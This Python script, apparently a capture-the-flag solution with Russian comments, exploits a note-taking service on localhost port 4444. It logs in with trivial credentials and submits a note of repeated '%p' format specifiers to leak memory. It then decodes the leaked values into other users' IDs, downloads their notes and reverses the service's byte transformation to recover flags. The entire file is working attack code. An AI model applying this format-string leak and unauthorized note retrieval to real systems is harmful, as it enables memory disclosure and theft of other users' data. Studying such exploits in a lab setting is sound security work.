#!/usr/bin/env python3

import socket
import time
import re
import os

def hex_to_ascii_le(hex_str):
    """Конвертирует hex строку в ASCII (little-endian)"""
    if hex_str.startswith('0x'):
        hex_str = hex_str[2:]
    
    if len(hex_str) % 2 != 0:
        hex_str = '0' + hex_str
    
    bytes_list = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]
    bytes_list.reverse()
    result = ''.join([chr(int(b, 16)) for b in bytes_list if int(b, 16) >= 32])
    return result

def reverse_transform_bytewise(data: bytes) -> bytes:
    """Обратное трансформирование байтов"""
    if not data:
        return b""
    
    content = bytearray(data)
    total_len = len(content)
    
    content.reverse()
    
    new_content = content[:]
    i = 0
    while i + 3 < total_len:
        temp0 = new_content[i + 3]
        temp1 = new_content[i + 2]
        temp2 = new_content[i + 1]
        temp3 = new_content[i]
        
        new_content[i] = temp0
        new_content[i + 1] = temp1
        new_content[i + 2] = temp2
        new_content[i + 3] = temp3
        i += 4
    
    content = new_content
    
    if len(content) > 20000:
        original_len = len(content) - 20000
        return bytes(content[10000:10000 + original_len])
    return bytes(content)

def process_note_file(filename):
    """
    Обрабатывает файл с заметкой:
    - Проверяет наличие маркера "не найдена или пуста"
    - Применяет обратное трансформирование
    - Декодирует результат в разные кодировки
    """
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Проверяем наличие маркера "не найдена или пуста"
        if "не найдена или пуста" in content:
            print(f"[!] Файл {filename} содержит маркер 'не найдена или пуста', пропускаем")
            return None
        
        # Убираем пробелы в начале и конце (но сохраняем все символы внутри)
        content = content.strip()
        
        original_len = len(content)
        print(f"[*] {filename}: Длина строки: {original_len} символов")
        
        # Преобразуем в байты для обратного трансформирования
        data = content.encode('utf-8')
        
        # Применяем обратное трансформирование
        restored = reverse_transform_bytewise(data)
        
        # Пробуем декодировать в разные кодировки
        result = None
        for enc in ['utf-8', 'cp1251', 'koi8-r', 'cp866']:
            try:
                result = restored.decode(enc)
                print(f"[+] {filename}: Успешно декодировано в {enc}")
                break
            except:
                continue
        
        if result is None:
            result = restored.decode('utf-8', errors='replace')
            print(f"[!] {filename}: Декодировано с заменой ошибок")
        
        return result
        
    except FileNotFoundError:
        print(f"[-] Файл {filename} не найден")
        return None
    except Exception as e:
        print(f"[-] Ошибка при обработке {filename}: {e}")
        return None

def decode_hex_file():
    """Декодирует hex.txt в decoded_hex.txt"""
    try:
        with open('hex.txt', 'r') as file:
            lines = file.readlines()
        
        decoded_lines = []
        for line in lines:
            line = line.strip()
            if line:
                decoded = hex_to_ascii_le(line)
                decoded_lines.append(decoded)
        
        full_result = '\n'.join(decoded_lines)
        
        with open('decoded_hex.txt', 'w', encoding='utf-8') as f:
            f.write(full_result)
        
        print(f"[+] Декодировано {len(decoded_lines)} строк в decoded_hex.txt")
        return True
    except FileNotFoundError:
        print("[-] Файл hex.txt не найден")
        return False
    except Exception as e:
        print(f"[-] Ошибка при декодировании: {e}")
        return False

def combine_to_32():
    """
    Объединяет все строки из decoded_hex.txt в одну строку,
    разбивает по 32 символа, удаляет дубликаты, берет первые 10 и сохраняет в combination_32.txt
    """
    try:
        with open('decoded_hex.txt', 'r', encoding='utf-8') as file:
            lines = file.readlines()
        
        combined = ''.join([line.strip() for line in lines if line.strip()])
        
        print(f"[+] Общая длина строки: {len(combined)} символов")
        
        chunks_32 = [combined[i:i+32] for i in range(0, len(combined), 32)]
        
        seen = set()
        unique_chunks = []
        for chunk in chunks_32:
            if chunk not in seen:
                seen.add(chunk)
                unique_chunks.append(chunk)
        
        print(f"[+] Найдено {len(chunks_32)} блоков, уникальных: {len(unique_chunks)}")
        
        first_10_chunks = unique_chunks[:10]
        
        with open('combination_32.txt', 'w', encoding='utf-8') as f:
            for chunk in first_10_chunks:
                f.write(chunk + '\n')
        
        print(f"[+] Сохранено {len(first_10_chunks)} уникальных блоков (первые 10) в combination_32.txt")
        
        return first_10_chunks
        
    except FileNotFoundError:
        print("[-] Файл decoded_hex.txt не найден")
        return []
    except Exception as e:
        print(f"[-] Ошибка при объединении: {e}")
        return []

def download_notes(s, user_ids):
    """
    Скачивает заметки для каждого user_id в одной сессии
    Сохраняет результаты в 1.txt ... 10.txt
    """
    for idx, user_id in enumerate(user_ids, 1):
        if idx > 10:
            break
            
        print(f"\n[*] Скачивание заметки {idx} для user_id: {user_id}")
        
        # Выбираем "Скачать заметку" (3)
        s.send(b'3\n')
        time.sleep(0.1)
        
        # Получаем запрос user_id
        data = s.recv(1024).decode('utf-8', errors='ignore')
        print(data)
        
        # Отправляем user_id
        s.send((user_id + '\n').encode())
        time.sleep(0.1)
        
        # Получаем содержимое заметки
        data = b''
        while True:
            try:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
                if len(chunk) < 65536:
                    break
            except socket.timeout:
                break
        
        data = data.decode('utf-8', errors='ignore')
        
        # Извлекаем содержимое заметки между маркерами
        start_marker = "=== ПОЛНОЕ СОДЕРЖИМОЕ ЗАМЕТКИ ==="
        end_marker = "=== КОНЕЦ ЗАМЕТКИ ==="
        
        start_idx = data.find(start_marker)
        end_idx = data.find(end_marker)
        
        if start_idx != -1 and end_idx != -1 and end_idx > start_idx:
            note_content = data[start_idx + len(start_marker):end_idx].strip()
            
            # Сохраняем в файл
            filename = f"{idx}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(note_content)
            
            print(f"[+] Заметка сохранена в {filename} (длина: {len(note_content)} символов)")
        else:
            print(f"[-] Не удалось найти содержимое заметки для {user_id}")
            
            # Пытаемся найти заметку без маркеров (на случай если формат другой)
            if data.strip():
                with open(f"{idx}.txt", 'w', encoding='utf-8') as f:
                    f.write(data.strip())
                print(f"[+] Сохранены сырые данные в {idx}.txt")
        
        # Отправляем пустую строку или любой символ, чтобы получить меню
        s.send(b'\n')
        time.sleep(0.1)
        
        # Получаем меню для следующей итерации
        try:
            menu = s.recv(4096).decode('utf-8', errors='ignore')
        except:
            pass

def process_all_notes():
    """
    Обрабатывает все файлы заметок (1.txt ... 10.txt)
    и сохраняет результаты в flags.txt (без удаления символов)
    """
    print("\n[*] Начинаем обратное трансформирование заметок...")
    
    results = []
    
    for i in range(1, 11):
        filename = f"{i}.txt"
        
        # Проверяем существование файла
        if not os.path.exists(filename):
            print(f"[-] Файл {filename} не существует, пропускаем")
            continue
        
        print(f"\n[*] Обработка {filename}...")
        result = process_note_file(filename)
        
        if result is not None:
            results.append(result)
            print(f"[+] {filename}: Обработан успешно")
        else:
            print(f"[!] {filename}: Пропущен")
    
    # Сохраняем все результаты в flags.txt
    if results:
        with open('flags.txt', 'w', encoding='utf-8') as f:
            for result in results:
                f.write(result + '\n')
        print(f"\n[+] Сохранено {len(results)} результатов в flags.txt")
    else:
        print("\n[-] Нет результатов для сохранения")
    
    return results

def interact_with_service():
    # Подключаемся
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 4444))
    
    # Получаем начальное меню
    data = s.recv(1024).decode('utf-8', errors='ignore')
    print(data)
    
    # Пробуем зарегистрироваться (1)
    print("[+] Пробуем регистрацию...")
    s.send(b'1\n')
    time.sleep(0.1)
    
    # Получаем запрос логина
    data = s.recv(1024).decode('utf-8', errors='ignore')
    print(data)
    
    # Отправляем логин
    username = '1'
    s.send((username + '\n').encode())
    time.sleep(0.1)
    
    # Получаем ответ (ошибка или запрос пароля)
    data = s.recv(4096).decode('utf-8', errors='ignore')
    print(data)
    
    # Проверяем, есть ли ошибка о существующем пользователе
    if "уже существует" in data or "already exists" in data:
        print("[+] Пользователь уже существует, пробуем войти...")
        
        # Отправляем выбор авторизации (2)
        s.send(b'2\n')
        time.sleep(0.1)
        
        # Получаем запрос логина
        data = s.recv(1024).decode('utf-8', errors='ignore')
        print(data)
        
        # Отправляем логин
        s.send((username + '\n').encode())
        time.sleep(0.1)
        
        # Получаем запрос пароля
        data = s.recv(1024).decode('utf-8', errors='ignore')
        print(data)
        
        # Отправляем пароль
        password = '1'
        s.send((password + '\n').encode())
        time.sleep(0.1)
        
        # Получаем результат авторизации
        data = s.recv(4096).decode('utf-8', errors='ignore')
        print(data)
    else:
        # Если ошибки нет, значит запрос пароля, отправляем его
        if "Пароль:" in data:
            password = '1'
            s.send((password + '\n').encode())
            time.sleep(0.1)
            
            # Получаем результат регистрации
            data = s.recv(4096).decode('utf-8', errors='ignore')
            print(data)
            print("[+] Регистрация прошла успешно!")
        else:
            print("[-] Неизвестный ответ сервера")
            s.close()
            return
    
    # Находим user_id
    user_id_match = re.search(r'user_id:\s*([a-f0-9]+)', data)
    if not user_id_match:
        try:
            data += s.recv(4096).decode('utf-8', errors='ignore')
            user_id_match = re.search(r'user_id:\s*([a-f0-9]+)', data)
        except:
            pass
    
    if user_id_match:
        user_id = user_id_match.group(1)
        print(f"[+] User ID: {user_id}")
        
        # Создаем строку %p
        note = '.'.join(['%p'] * 85)
        
        print("\n[*] Запись заметки...")
        
        # Записываем заметку (1)
        s.send(b'1\n')
        time.sleep(0.1)
        
        # Получаем запрос текста заметки
        data = s.recv(1024).decode('utf-8', errors='ignore')
        print(data)
        
        # Отправляем заметку
        s.send((note + '\n').encode())
        time.sleep(0.1)
        
        # Получаем подтверждение и меню
        data = s.recv(4096).decode('utf-8', errors='ignore')
        print(data)
        
        print("\n[*] Чтение заметки...")
        
        # Читаем заметку (2)
        s.send(b'2\n')
        time.sleep(0.1)
        
        # Получаем запрос user_id
        data = s.recv(1024).decode('utf-8', errors='ignore')
        print(data)
        
        # Отправляем user_id
        s.send((user_id + '\n').encode())
        time.sleep(0.1)
        
        # Получаем заметку (увеличенный буфер)
        data = b''
        while True:
            try:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
                if len(chunk) < 65536:
                    break
            except socket.timeout:
                break
        
        data = data.decode('utf-8', errors='ignore')
        print(data[:500] + "...\n[+] Данные получены")
        
        # Ищем hex значения (0x + 16 hex символов)
        hex_values = re.findall(r'0x[a-f0-9]{16}', data)
        
        # Сохраняем в файл
        with open('hex.txt', 'w') as f:
            for hex_val in hex_values:
                f.write(hex_val + '\n')
        
        print(f"\n[+] Найдено {len(hex_values)} hex значений")
        print("[+] Сохранено в hex.txt")
        
        # Декодируем hex файл
        print("\n[*] Начинаем декодирование hex.txt...")
        if decode_hex_file():
            # Объединяем в блоки по 32
            print("\n[*] Объединение в блоки по 32 символа...")
            user_ids = combine_to_32()
            
            if user_ids:
                # Скачиваем заметки в той же сессии
                print("\n[*] Начинаем скачивание заметок...")
                download_notes(s, user_ids)
                print("\n[+] Все заметки успешно скачаны!")
                
                # После скачивания всех заметок, обрабатываем их
                process_all_notes()
        
    else:
        print("[-] Не найден user_id")
        print("[DEBUG] Последние полученные данные:")
        print(data[:500])
    
    # Закрываем соединение
    s.close()

if __name__ == "__main__":
    interact_with_service()
